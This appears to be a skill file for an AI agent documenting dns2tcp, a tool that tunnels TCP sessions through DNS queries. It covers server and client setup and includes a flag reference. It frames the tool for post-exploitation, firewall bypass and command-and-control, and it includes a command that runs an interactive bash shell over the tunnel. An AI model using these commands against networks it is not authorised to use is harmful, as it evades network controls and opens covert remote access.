---
name: dns2tcp
description: Encapsulate TCP sessions within DNS packets to bypass firewalls or restrictive network environments. Use when performing post-exploitation, establishing command and control (C2) channels, or tunneling traffic (like SSH) over DNS in environments where only DNS queries are permitted.
---

# dns2tcp

## Overview
dns2tcp is a set of tools designed to encapsulate TCP traffic in DNS packets. It utilizes TXT or KEY records to tunnel data, providing better throughput than traditional IP-over-DNS methods by focusing on TCP session encapsulation. The suite consists of a server (`dns2tcpd`) and a client (`dns2tcpc`). Category: Post-Exploitation / Sniffing & Spoofing.

## Installation (if not already installed)
Assume the tool is installed. If not, use:
```bash
sudo apt install dns2tcp
```

## Common Workflows

### Server Setup (dns2tcpd)
Create a configuration file (e.g., `.dns2tcpdrc`):
```conf
listen = 0.0.0.0
port = 53
user = nobody
chroot = /tmp
pid_file = /var/run/dns2tcp.pid
domain = tunnel.example.com
key = mysecretkey
resources = ssh:127.0.0.1:22, smtp:127.0.0.1:25
```
Run the server in the foreground for debugging:
```bash
dns2tcpd -F -d 1 -f .dns2tcpdrc
```

### Client Setup (dns2tcpc)
List available resources on the server:
```bash
dns2tcpc -z tunnel.example.com <server_ip>
```

Establish a local forwarder for SSH:
```bash
dns2tcpc -c -z tunnel.example.com -k mysecretkey -r ssh -l 2222 <server_ip>
```
Then connect via SSH:
```bash
ssh root@localhost -p 2222
```

### Direct Program Execution
Execute a shell directly over the DNS tunnel:
```bash
dns2tcpc -z tunnel.example.com -r ssh -e "/bin/bash -i" <server_ip>
```

## Complete Command Reference

### dns2tcpc (Client)
```
Usage: dns2tcpc [options] [server]
```

| Flag | Description |
|------|-------------|
| `-c` | Enable compression |
| `-z <domain>` | Domain to use (Mandatory) |
| `-d <1\|2\|3>` | Debug level (1, 2, or 3) |
| `-r <resource>` | Resource to access (e.g., ssh) |
| `-k <key>` | Pre-shared key for authentication |
| `-f <filename>` | Path to configuration file |
| `-l <port\|->` | Local port to bind; '-' is for stdin (Mandatory if resource defined without `-e`) |
| `-e <program>` | Program to execute over the tunnel |
| `-t <delay>` | Max DNS server's answer delay in seconds (Default: 3) |
| `-T <TXT\|KEY>` | DNS request type (Default: TXT) |
| `server` | IP address of the DNS server to use |

### dns2tcpd (Server)
```
Usage: dns2tcpd [ -i IP ] [ -F ] [ -d debug_level ] [ -f config-file ] [ -p pidfile ]
```

| Flag | Description |
|------|-------------|
| `-i <IP>` | IP address to listen on |
| `-F` | Run in the foreground |
| `-d <level>` | Debug level (1, 2, or 3) |
| `-f <file>` | Path to configuration file |
| `-p <file>` | Path to PID file |

### Configuration File Options
The following fields can be used in the configuration files (`-f`):
- `domain`: The domain name used for the tunnel.
- `key`: Pre-shared secret key.
- `resources`: (Server only) Defined as `name:IP:port`.
- `listen`: (Server only) IP to listen on.
- `port`: (Server only) Port to listen on (usually 53).
- `user`: (Server only) User to run the daemon as.
- `chroot`: (Server only) Directory to chroot into.
- `local_port`: (Client only) Local port to bind.

## Notes
- **DNS Setup**: You must configure an `NS` record in your DNS zone pointing the tunnel subdomain to your `dns2tcpd` server's IP (e.g., `tunnel.example.com. IN NS lab.example.com.`).
- **Permissions**: The client does not require root privileges. The server usually requires root to bind to port 53.
- **Latency**: DNS tunneling is inherently slow and high-latency compared to standard TCP.
- **Security**: Use the `key` option to prevent unauthorized use of your tunnel.